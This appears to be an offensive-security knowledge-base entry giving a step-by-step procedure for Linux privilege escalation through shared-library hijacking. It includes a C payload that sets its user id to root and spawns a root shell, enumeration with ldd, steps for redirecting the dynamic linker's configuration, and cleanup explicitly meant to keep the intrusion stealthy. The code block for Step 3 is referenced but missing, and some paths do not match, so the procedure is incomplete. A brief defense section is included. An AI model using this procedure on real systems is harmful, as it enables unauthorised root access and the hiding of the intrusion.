---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.376124+00:00'
updated_at: '2023-04-10T20:34:33.723882+00:00'
tactics:
  - '[[Defense Evasion]]'
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Hijack Execution Flow]]'
sub_techniques: []
tags:
  - ldconfig
  - Linux-Privilege-Escalation
  - Shared-Library
commands:
  - '[[commands/ldd-list-shared-libraries]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-Shared-Library-Dependencies

## Summary

This procedure exploits shared library dependencies on a Linux system to achieve privilege escalation by creating and loading a malicious shared library that executes with elevated privileges when a vulnerable setuid binary is run. It targets the dynamic linker's search path manipulation via ldconfig, allowing an attacker with low-privilege access to inject code into privileged processes.

## Description

Shared libraries (.so files) are loaded dynamically by executables on Linux systems using the dynamic linker (ld.so). If a setuid binary (which runs with elevated privileges) depends on a library whose search path can be influenced by a low-privileged user, an attacker can place a malicious library in a prioritized directory. This procedure identifies such dependencies using ldd, creates a simple malicious library (e.g., one that spawns a root shell), compiles it, updates the ld.so.conf configuration to include the attacker's directory, and refreshes the cache with ldconfig. When the setuid binary executes, it loads the malicious library instead of the legitimate one, executing the attacker's code as root. This is effective on systems where /etc/ld.so.conf.d is writable or configurable by non-root users, or in misconfigured environments. It requires initial foothold access and is commonly used in post-exploitation for persistence and escalation.

## Requirements

1. Low-privilege shell access to the target Linux system (e.g., via initial access vector).
2. Write access to a temporary directory like /tmp and potentially /etc/ld.so.conf.d (or ability to influence library paths).
3. GCC compiler installed on the target (common on most distributions).
4. A vulnerable setuid binary that loads modifiable libraries (identified via enumeration).

## Defense

- Enforce strict file permissions on /etc/ld.so.conf and /etc/ld.so.conf.d directories to prevent non-root modifications.
- Use tools like AppArmor or SELinux to confine setuid binaries and restrict library loading paths.
- Monitor ldconfig executions and changes to library configurations via auditd or sysdig.
- Regularly audit setuid binaries with tools like find / -perm -4000 and verify their library dependencies.
- Implement integrity monitoring (e.g., AIDE or Tripwire) for system libraries and binaries.

## Objectives

1. Identify shared library dependencies of privileged binaries to find hijackable paths.
2. Create and deploy a malicious shared library to execute arbitrary code with root privileges.
3. Achieve persistent root access on the compromised Linux system.

## Instructions

### Step 1: Identify Vulnerable Binaries and Their Dependencies

**Context**: Begin by locating setuid binaries and listing their shared library dependencies to identify libraries that can be hijacked. Focus on binaries in standard paths like /usr/bin or /opt that run with elevated privileges but load libraries from user-writable locations.

**Command** ([[commands/ldd-list-shared-libraries]]):
```bash
ldd $_EXECUTABLE
```

> This command prints the shared libraries required by the specified executable, showing paths where libraries are loaded from. Look for libraries in /lib, /usr/lib, or custom paths that might precede user-controlled directories like /tmp in the search order. For example, run it on a setuid binary like /usr/bin/sudo or a custom /opt/binary to map dependencies.

### Step 2: Create Malicious Library Source and Directory

**Context**: Prepare the environment by creating a writable directory for the malicious library and writing a simple C source file that will execute a root shell when loaded (e.g., via a constructor function).

Create the directory:
```bash
mkdir /tmp/exploit_lib
```

Write the source file /tmp/vulnlib.c (example content for a basic payload - adjust as needed):
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
__attribute__((constructor))
void dropshell() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
```

> This step sets up the payload. The constructor attribute ensures the function runs when the library is loaded, spawning a root shell before the binary proceeds.

### Step 3: Compile and Load the Malicious Library

**Context**: Compile the C source into a shared object (.so) file matching a hijackable library name (e.g., vulnlib.so from the ldd output). Then, configure the dynamic linker's search path to prioritize /tmp/exploit_lib and cache it with ldconfig.

**Code** ([[codes/Compile-and-Load-Malicious-Shared-Library]]):

> Use this multi-step code block to build and register the library. It assumes the source is ready and targets a specific library name from Step 1. The echo adds /tmp to the config, and ldconfig updates the cache to load from there first.

### Step 4: Execute the Vulnerable Binary

**Context**: Run the identified setuid binary to trigger loading of the malicious library. If successful, it will execute the payload with root privileges.

```bash
$_EXECUTABLE
```

> Replace $_EXECUTABLE with the path from Step 1 (e.g., /opt/binary). The binary will load vulnlib.so from /tmp instead of the system path, running the constructor to drop a root shell.

### Step 5: Verify Escalation

**Context**: Confirm privilege escalation by checking the shell's privileges and cleaning up traces if needed.

```bash
id
whoami
```

> Success is indicated by uid=0(root) output. Remove the malicious files and config afterward to maintain stealth: rm /tmp/exploit_lib/*; rm /etc/ld.so.conf.d/exploit.conf; ldconfig.
